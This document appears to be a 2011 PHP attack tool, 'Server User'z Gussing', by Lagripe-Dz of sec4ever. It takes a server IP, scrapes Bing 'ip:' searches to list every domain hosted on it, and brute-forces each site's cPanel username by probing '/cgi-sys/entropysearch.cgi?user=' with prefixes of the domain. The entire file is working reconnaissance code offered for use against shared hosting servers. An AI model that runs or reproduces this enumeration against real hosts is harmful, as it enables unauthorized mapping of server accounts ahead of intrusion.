<!--

Title.......: [ Server User'z Gussing ]
c0d3r.......: [ Lagripe-Dz ]
HoMe........: [ wWw.sEc4EvEr.CoM ]
Date........: [ 01/03/2o11 ]
MyBlog......: [ LagripeDz.wordpress.org ]

-->
<html>
<head>
<meta http-equiv="Content-Language" content="fr">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>#~Server User'z Gussing</title>
<style>
body,table{background: black; font-family:Verdana,tahoma; color: white; font-size:10px; }
A:link {text-decoration: none;color: red;}
A:active {text-decoration: none;color: red;}
A:visited {text-decoration: none;color: red;}
A:hover {text-decoration: underline; color: red;}
#x{ font-size:15px; }
input,table,td,tr,#gg{border-style:solid;text-decoration:bold;}
input:hover,tr:hover,td:hover{background-color: #FFFFCC; color:green;}
</style>
</head>

<body>
<center><br><br><br>
<p id=x>#~Server User'z Gussing</p>
<form action="" method="GET">
IP : <input type='text' name='ip'>
<input type='submit' value='ScaN'>

</form>
<?php

@set_time_limit(0);
@error_reporting(E_ALL | E_NOTICE);

/******** nEw **************/
$result=array();

function get_user($site){

$t=cc($site);

$s=strlen($t);

for($i=0;$i<=$s;$i++){ $userz[]=substr($t,0,$i); }

foreach($userz as $v=>$user){

$z=@file_get_contents($site."cgi-sys/entropysearch.cgi?user=$user");

if(eregi("/home/$user",$z)){ 

return "<tr><td>$site</td><td>$user</td></tr>";//break;

}

}

}


function cc($uu){
$x=array("www.",".","-","http://");
foreach($x as $xx){ $uu = str_replace($xx,"",$uu); }
return $uu;
}

function clean_url($x){

$z=parse_url($x);

$x=$z['host']."";

return $x;

}

$npages = 50000;

$npage = 1;

$allLinks = array();

if(isset($_GET['ip'])){

  $ip=trim($_GET['ip']);
		
  //if(!@file_get_contents("http://".$ip.":2082/")){ EcHo "[~] Server Don't have Cpanel .. :("; return false; }
  
  while($npage <= $npages) 
  { 
  
  $x=@file_get_contents('http://www.bing.com/search?q=ip%3A' . $ip . '&first=' . $npage);

  
	if ($x)
	{
		preg_match_all('(<div class="sb_tlst">.*<h3>.*<a href="(.*)".*>(.*)</a>.*</h3>.*</div>)siU', $x, $findlink);
		
		foreach ($findlink[1] as $fl)
		
		$allLinks[]=clean_url($fl);
		
		
		$npage = $npage + 10;
		
		if (preg_match('(first=' . $npage . '&amp)siU', $x, $linksuiv) == 0) 
			break;			   
	}
	
    else
		break;
  }

$allDmns = array();


	foreach ($allLinks as $kk => $vv){
	
	$allDmns[] = "http://".$vv."/";
	
	}
	
	$allDmns = array_unique($allDmns);
	$num_s = count($allDmns);
    

EcHo"<p>Server Content a [ ".$num_s." ] Site</p>";


EcHo"<table border=1 width=50%>
<tr><td>Domain</td><td>user</td></tr>";

foreach($allDmns as $link){

EcHo get_user($link);
$y = (get_user($link)) ? $all[]=get_user($link):"";
}
EcHo"</table>";


EcHo"<p>".count($all)." user founded from ".$num_s."</p>";

}
?>
</body>
<br><p align="center">
(c)0d3d By <a href='http://lagripedz.wordpress.com/'>Lagripe-Dz</a> | <a href='http://wWw.sEc4EvEr.CoM/'>wWw.sEc4EvEr.CoM</a><br>
MaDe in AlGeriA 2o11 (r)
</p>